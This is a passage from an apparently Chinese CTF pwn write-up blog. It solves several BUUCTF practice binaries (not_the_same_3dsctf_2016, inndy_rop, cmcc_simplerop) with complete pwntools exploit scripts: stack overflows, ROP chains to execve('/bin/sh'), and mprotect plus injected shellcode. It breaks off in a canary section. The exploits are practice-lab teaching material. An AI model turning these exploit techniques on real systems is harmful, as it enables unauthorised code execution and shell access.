class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">getflag_addr = <span class="number">0x080489A0</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(getflag_addr)</span><br><span class="line"><span class="comment">#payload += p32(printf_addr) + p32(1) + p32(flag_addr)</span></span><br><span class="line">payload += p32(printf_addr) + p32(exit_addr) + p32(flag_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地创建一个flag.txt测试一下没问题,然后把p32(1)改成p32(exit_addr),远程也能通过了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809131447147.png" alt="image-20230809131447147"></p><p>或者这样用fflush也行,不过那个stdout的地址不是直接找到的那个,调试找出来的,先记录一下再说:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">getflag_addr = <span class="number">0x080489A0</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line">fflush_addr = <span class="number">0x0804F3A0</span></span><br><span class="line">stdout_addr = <span class="number">0x80EB200</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(getflag_addr)</span><br><span class="line">payload += p32(printf_addr) + p32(fflush_addr) + p32(flag_addr)</span><br><span class="line"><span class="comment"># payload += p32(printf_addr) + p32(exit_addr) + p32(flag_addr)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(stdout_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个用fflush也行,就是stdout这个文件指针一下子没找到正确的那个</p><h3 id="方法二">方法二</h3><p>这个应该是正解吧…或者可能是出题人疏忽了没搞三件套?(啥是三件套QWQ)</p><p>ret2shell的做法:</p><p>首先用checksec看看,发现有NX保护</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809132028022.png" alt="image-20230809132028022"></p><p>然后IDA中发现了mprotect():</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809131755622.png" alt="image-20230809131755622"></p><p>int mprotect(void *addr, size_t len, int prot)</p><p>三个参数分别是修改的起始地址，长度，修改为的权限</p><p>首先用这个函数去把.bss提权为可写权限(直接用7就行)</p><p>然后利用read进行shellcode的植入(read函数进行unix的读写)</p><p>接着就跳转到shellcode的位置进行getshell即可</p><p>注意:因为参数为3个,所以需要一个pop三连+ret的指令,这里用</p><p><code>ROPgadget --binary not_the_same_3dsctf_2016 --only 'pop|ret' | grep pop</code></p><p>来获取,随便一个就行,例如:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809134557805.png" alt="image-20230809134557805" style="zoom:45%;" /><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line">mprotect_addr = <span class="number">0x0806ED40</span></span><br><span class="line"><span class="comment"># getflag_addr = 0x080489A0</span></span><br><span class="line"><span class="comment"># flag_addr = 0x080ECA2D</span></span><br><span class="line">pppr_addr = <span class="number">0x0806fcf0</span>  <span class="comment"># 使用ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27; | grep pop取得</span></span><br><span class="line">bss_addr = <span class="number">0x080EB000</span></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">read_addr = <span class="number">0x0806E200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(mprotect_addr) + p32(pppr_addr) + p32(bss_addr) + p32(size) + p32(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># read --- 从stdin(0)即标准输入读取到bss_addr中</span></span><br><span class="line">payload += p32(read_addr) + p32(pppr_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(size)</span><br><span class="line"><span class="comment"># run shellcode</span></span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一直进行到read准备getshell</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode的读取(asm函数百度来的...)</span></span><br><span class="line">payload1=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参见:</p><p><a href="https://blog.csdn.net/Kata_Jhin/article/details/129540833?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22129540833%22%2C%22source%22%3A%22Kata_Jhin%22%7D">https://blog.csdn.net/Kata_Jhin/article/details/129540833?csdn_share_tail={&quot;type&quot;%3A&quot;blog&quot;%2C&quot;rType&quot;%3A&quot;article&quot;%2C&quot;rId&quot;%3A&quot;129540833&quot;%2C&quot;source&quot;%3A&quot;Kata_Jhin&quot;}</a></p><p>(不是一个题,但是做法差不多一样…)</p><p>结束…</p><h2 id="inndy-rop">inndy_rop</h2><p>这道题是rop…ret2syscall…</p><p>ROPgadget是真的好用啊…</p><p>那么我正好看了某个文章:</p><p><a href="https://repw.github.io/2018/10/27/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8BROP%E5%9F%BA%E7%A1%80/#undefined">https://repw.github.io/2018/10/27/栈溢出之ROP基础/#undefined</a></p><p>关于系统调用号:</p><p>​截图取自:<a href="https://blog.csdn.net/kaiandshan/article/details/44587225">https://blog.csdn.net/kaiandshan/article/details/44587225</a></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812235944050.png" alt="image-20230812235944050" style="zoom: 50%;" /></p><h3 id="题目分析">题目分析:</h3><p>代码非常简单,直接从一个overflow函数中gets()溢出,但是发现没有system()这些可利用的东西</p><p>所以是一个rop的题,那么既然是rop,就去用ROPgadget找rop</p><p>首先,最粗暴的方法就是直接用ROPgadget的一个奇葩功能直接生成shellcode,然后粘贴进脚本,加上偏移就行…</p><p><code>ROPgadget --binary rop --ropchain</code></p><p>使用该命令就会自动生成rop链,粘贴进脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># 记得要加上pack这个模块的引用,因为shellcode要用到</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27861</span>)</span><br><span class="line"><span class="comment"># 定义一个函数,将生成的shellcode直接粘贴进去,加上b&#x27;a&#x27; * (0xc + 4)的偏移即可</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shellcode</span>():</span><br><span class="line">    p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span> + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>)  <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>)  <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>)  <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>)  <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = shellcode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行没有问题:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812234652868.png" alt="image-20230812234652868"></p><p>然后我想自己构造(具体知识见百度[ctf rop]…):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop_eax_ret_addr = <span class="number">0x080b8016</span></span><br><span class="line">pop_edx_ecx_ebx_ret_addr = <span class="number">0x0806ed00</span></span><br><span class="line">sh_addr = <span class="number">0x080be47d</span></span><br><span class="line">int_0x80_addr = <span class="number">0x0806c943</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span>+<span class="number">4</span>) + p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(sh_addr)+p32(int_0x80_addr)</span><br></pre></td></tr></table></figure><p>但是sh_addr不行,因为sys_execve()要使用’/bin/bash’,所以这里应该手动注入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812235420260.png" alt="image-20230812235420260" style="zoom:50%;" /><p>截图取自https://blog.csdn.net/qq_73149934/article/details/128430238</p><p>这里先放个记录,回头再看看</p><h2 id="cmcc-simplerop">cmcc_simplerop</h2><p>这个题也是rop,不过用ROPgadget生成的shellcode跑不通,手动写的syscall可以过</p><p>checksec发现没有PIE,开了NX</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813120940170.png" alt="image-20230813120940170" style="zoom:45%;" /><p>题目很简单,就是直接让read溢出,这里的思路是用系统调用11来用execve进行getshell</p><p>先计算个偏移(IDA里直接看的有误):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125157314.png" alt="image-20230813125157314"></p><p>生成一串数字复制下来然后调试:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125237078.png" alt="image-20230813125237078"></p><p>输入那串字符:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125253822.png" alt="image-20230813125253822"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125318034.png" alt="image-20230813125318034"></p><p>这里提示了一个无效地址,然后再运行这个命令:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125359575.png" alt="image-20230813125359575"></p><p>找到偏移32(即0x20)</p><p>接下来分析rop,用ROPgadget发现没有’/bin/sh\x00’这个字符串,所幸有read函数,那么首先要用栈溢出将返回地址返回到read函数来将其注入到.bss段(这道题没有开启PIE，bss的地址就是绝对地址)</p><p>如此有第一段payload如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret to read() --- read &#x27;/bin/sh&#x27;</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"><span class="comment"># bin_sh_addr 为从.bss段中找的足够长的一段内存</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080EAFBF</span></span><br><span class="line"><span class="comment">#最后的0x8为接下来要输入的&#x27;/bin/sh\x00&#x27;字符串的长度</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>) + p32(read_addr) + p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure><p>再接下来就是系统调用,知识见inndy_rop的WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># syscall --- execve</span></span><br><span class="line">payload += p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(int_0x80_addr)</span><br></pre></td></tr></table></figure><p>最后记得要多加一个字符串的输入:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后总的代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26428</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rop&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_eax_ret_addr = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret_addr = <span class="number">0x0806e850</span></span><br><span class="line">sh_addr = <span class="number">0x080c1a9d</span></span><br><span class="line">int_0x80_addr = <span class="number">0x080493e1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ret to read() --- read &#x27;/bin/sh&#x27;</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"><span class="comment"># bin_sh_addr 为从.bss段中找的足够长的一段内存</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080EAFBF</span></span><br><span class="line"><span class="comment"># 最后的0x8为接下来要输入的&#x27;/bin/sh\x00&#x27;字符串的长度</span></span><br><span class="line"><span class="comment"># 0x20的偏移需要使用调试去动态检查出来(cyclic -l 0x61616169)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>) + p32(read_addr) + p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># syscall --- execve</span></span><br><span class="line">payload += p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(int_0x80_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的是失败的ropchain(ROPgadget生成的)</span></span><br><span class="line"><span class="comment"># def shellcode():</span></span><br><span class="line"><span class="comment">#     p = b&#x27;a&#x27; * 0x20</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # @ .data</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080bae06)  # pop eax ; ret</span></span><br><span class="line"><span class="comment">#     p += b&#x27;/bin&#x27;</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea064)  # @ .data + 4</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080bae06)  # pop eax ; ret</span></span><br><span class="line"><span class="comment">#     p += b&#x27;//sh&#x27;</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x08054250)  # xor eax, eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080481c9)  # pop ebx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # @ .data</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e851)  # pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # padding without overwrite ebx</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x08054250)  # xor eax, eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080493e1)  # int 0x80</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = shellcode()</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813121936742.png" alt="image-20230813121936742" style="zoom:45%;" /><p>结束…</p><h2 id="canary1">canary1</h2><p>关于canary…百度复习吧…</p><p>绕过方法:</p><p>​1.大量fork的题: 使用逐字节爆破的方法</p><p>​2.字符串输出泄露canary</p><p>​3.GOT表劫持</p><p>但是…这道题是假的canary!!!</p><p>虽然checksec显示有canary…但是…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223357926.png" alt="image-20230813223357926" style="zoom:50%;" /><p>看汇编也能看出来,xor的结果根本就没有用到,下面是无条件跳转到call之后:</p><img 